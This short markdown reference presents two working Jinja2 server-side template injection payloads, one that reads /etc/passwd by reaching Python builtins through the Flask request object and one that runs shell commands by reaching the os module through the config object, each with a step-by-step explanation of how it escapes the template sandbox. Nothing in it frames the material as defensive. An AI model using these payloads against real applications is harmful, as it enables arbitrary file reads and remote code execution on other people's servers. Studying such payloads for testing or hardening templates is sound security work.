# Jinja2 SSTI Exploit Payloads

This document details verified payloads used to achieve Arbitrary File Read and Remote Code Execution (RCE) via Server-Side Template Injection (SSTI) in a Python/Jinja2 environment.

---

## Exploit Vectors & Mechanics

Jinja2 templates execute in a sandboxed environment where direct access to dangerous Python modules (like `os` or built-in functions like `open`) is restricted. To bypass these restrictions, payloads leverage **Python reflection**—navigating from safely exposed objects up to the application's global environment or built-in functions.

### 1. Arbitrary File Read Payload
This payload leverages the exposed `request` object to climb up to Python's built-in namespace to open and read local files.

#### Payload
```text
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}
```

#### Breakdowns & Execution Path:
* `request`: A standard Flask/Jinja global object representing the current HTTP request.
* `.__class__`: Accesses the underlying Python class of the request object (`flask.app.Request`).
* `._load_form_data`: Accesses a specific internal method native to that class.
* `.__globals__`: Pulls a dictionary of the global namespace where that method was defined.
* `.__builtins__`: Navigates into Python’s default built-in functions (which are normally blocked in the sandbox).
* `.open("/etc/passwd").read()`: Invokes the native `open()` function to read sensitive system files.

---

### 2. Remote Code Execution (RCE) Payload
This payload leverages the template's environment configuration object to access the `os` module and execute system commands.

#### Payload
```text
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
```

#### Breakdowns & Execution Path:
* `config`: A standard Flask template global object containing the application configuration.
* `.__class__.__init__`: Navigates to the initialization method of the configuration class.
* `.__globals__`: Drops into the global namespace of the module where the configuration object resides.
* `['os']`: References the imported Python `os` operating system module.
* `.popen('...').read()`: Spawns a shell command execution wrapper (`popen`), runs the specified command, and pipes the output back into the HTTP response.
